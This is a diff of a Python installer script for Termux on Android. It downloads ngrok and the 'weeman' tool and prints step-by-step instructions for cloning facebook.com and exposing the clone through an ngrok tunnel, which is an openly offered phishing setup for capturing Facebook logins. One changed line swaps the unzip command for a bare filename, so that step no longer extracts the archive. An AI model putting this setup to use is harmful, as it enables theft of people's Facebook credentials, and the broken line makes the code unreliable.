@@ -47,16 +47,13 @@ else:
 	print("==================================")
 	print("wget installed")
 	os.system("cd /data/data/com.termux/files/home && wget  https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip")
-	os.system("cd /data/data/com.termux/files/home && unzip ngrok-stable-linux-amd64.zip")
+	os.system("cd /data/data/com.termux/files/home && ngrok-stable-linux-arm.zip")
 	os.system("cd $home && sudo chmod 755 ngrok")
 	os.system("cd $home && cp ngrok /data/data/com.termux/files/usr/bin")
 	os.system("cd $home && git clone https://github.com/samyoyo/weeman.git")
 	os.system("cd /data/data/com.termux/files/home/weeman && chmod 755 weeman.py")
-	print("Now you'll need to start weeman.py with 'python weeman.py ")
-	print("\nuse 'show' to start")
-	print("""\nNow in a new session using termux type 'ngrok http 8080'.
-if you want https url just type 'ngrok http -bind-tls=true 8080' """)
-
-	print("\nnow go to weeman session opened in termux and type 'set url https://facebook.com")
-	print("\nNext, type set action_url 'xxx_ngrok.io'(this means that you put url that ngrok show to you when you activated it)")
-	print("\nAnd now type 'set port 8080'")
+	print("""Now you'll need to start weeman.py with 'python weeman.py'. Use 'show' to start
+Now in a new session using termux type 'ngrok http 8080'.
+if you want https url just type 'ngrok http -bind-tls=true 8080' 
+now go to weeman session opened in termux and type 'set url https://facebook.com'. Next, type set action_url 'xxx_ngrok.io'(this means that you put url that ngrok show to you when you activated it)
+and now type 'set port 8080'""")
